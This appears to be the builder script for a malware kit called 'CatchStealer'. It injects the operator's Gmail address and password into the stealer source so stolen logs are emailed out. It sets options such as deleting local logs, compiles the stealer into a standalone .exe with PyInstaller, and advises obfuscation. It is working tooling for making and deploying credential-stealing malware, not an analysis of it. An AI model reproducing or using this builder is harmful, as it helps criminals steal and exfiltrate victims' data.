ver = 1.0
print("- - - CATCHSTEALER BUILDER: " + str(ver) + " - - -")
import os
import time
import yaml
from modules import fileutils

warnings = []
errors = []

def end(error_code):
	print("\n\n<=-------------BUILD RESULTAT-------------=>")
	print("Total errors: " + str(len(errors)))
	print("Total warnings: " + str(len(warnings)) + "\n")
	if len(warnings) != 0:
		for warningList in warnings:
			print("WARNING: " + warningList)
	if len(errors) != 0:
		for errorsList in errors:
			print("ERROR: " + errorsList)

	print("\n\n<=-------------BUILD RESULTAT-------------=>")

	print("\n\n\nBuilder closed with: '" + str(error_code) + "' code.")
	if error_code == 0:
		input()
	else:
		exit()

try:
	with open("builderconf.yml") as f:
		conf = yaml.safe_load(f)
except Exception:
	print("[CONFIG_LOADER]: FAILED TO LOAD CONFIG(builderconf.yml)")
	errors = errors + ["EXCEPTION IN CONFIG_LOADER: COULDN'T LOAD CONFIG(builderconf.yml)"]
	end("couldn't load config")

try:
	pipExec = conf['pyconf']['pipExec']
	mail = conf['builder']['mail']
	password = conf['builder']['mailpassword']
	uselogging = conf['builder']['stealerlogging']
	execompile = conf['builder']['execompile']
	getotherlog = conf['builder']['getotherlog']
	logfilename = conf['builder']['logfilename']
	removelog = conf['builder']['removelog']

except KeyError:
	print("[CONFIG]: FAILED TO LOAD CONFIG FILE. PROBLEM WITH SYNTAX")
	end("failed to load config file")

if not mail.endswith("@gmail.com"):
	errors = errors + ["INCORRECT E-MAIL ADDRESS! ONLY GMAIL SUPPORTED!!!"]
	end("Incorrect e-mail")
if password == "":
	errors = errors + ["NO PASSWORD!"]

print("[CONFIG]: [" + time.strftime("%H:%m:%S") + "]: CONFIG LOADED!")

print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: BUILDING!")
try:
	with open("main.py", "r") as file:
		oldsrc = file.read()


	with open("main.py", "r") as file:
		src = file.read()
		src = src.replace("enabledLog = True", "enabledLog = " + str(uselogging))
		src = src.replace("MailToLog = \"\"", "MailToLog = \"" + mail + "\"")
		src = src.replace("MailPassword = \"\"", "MailPassword = \"" + password + "\"")
		src = src.replace("getotherlog = True", "getotherlog = " + str(getotherlog))
		src = src.replace("logfilename = \"\"", "logfilename = \"" + str(logfilename) + "\"")
		src = src.replace("removelog = True", "removelog = " + str(removelog))
		
	with open("build.py", "w") as file:
		file.write(src)
		print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: EDITING SOURCE FILE IS COMPLETED")
except FileNotFoundError:
	delay = 5
	print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: FAILED TO LOAD SOURCE FILE. COPY IT TO BUILDER DIRECTORY. WAITING " + str(delay) + "S.")
	warnings = warnings + ["FAILED TO LOAD SOURCE FILE, WAITING"]
	isLoaded = False
	while isLoaded == False:
		time.sleep(delay)
		try:
			with open("main.py", "r") as file:
				src = file.read()
				src = src.replace("enabledLog = True", "enabledLog = " + str(uselogging))
				src = src.replace("MailToLog = \"\"", "MailToLog = \"" + mail + "\"")
				src = src.replace("MailPassword = \"\"", "MailPassword = \"" + password + "\"")
				src = src.replace("getotherlog = True", "getotherlog = " + str(getotherlog))
				src = src.replace("logfilename = \"\"", "logfilename = \"" + str(logfilename) + "\"")
				src = src.replace("removelog = True", "removelog = " + str(removelog))
			with open("build.py", "w") as file:
				file.write(src)

			print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: EDITING SOURCE FILE IS COMPLETED")
			isLoaded = True
		except:
			delay = int(delay) * 2
			print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: FAILED TO LOAD SOURCE FILE. COPY IT TO BUILDER DIRECTORY. WAITING " + str(delay) + "S.")

if execompile == True:
	print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: COMPILING TO .EXE FILE, REQUEST BY USER")
	os.system(pipExec + " install pyinstaller")
	os.system("pyinstaller build.py --onefile")
	if os.path.exists(os.getcwd() + "/build.exe"):
		fileutils.removeFile(os.getcwd() + "/build.exe")
	fileutils.copyFile(os.getcwd() + "/dist/build.exe", os.getcwd() + "/build.exe")
	fileutils.removeFile(os.getcwd() + "/build.py")
	print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: All done. Get your stealer from BUILDER_DIRECOTORY/build.exe")
if execompile == False:
	print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: SKIPPING COMPILING TO .EXE FILE.")
	warnings = warnings + ["SKIPPING COMPILING TO .EXE FILE, RECOMMENDED TO USE OBFUSCATION!"]
	print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: All done.")

print("[BUILDER_MAIN]: [" + time.strftime("%H:%m:%S") + "]: Writing source file...")
with open("main.py", "w") as file:
	file.write(oldsrc)
end(0)
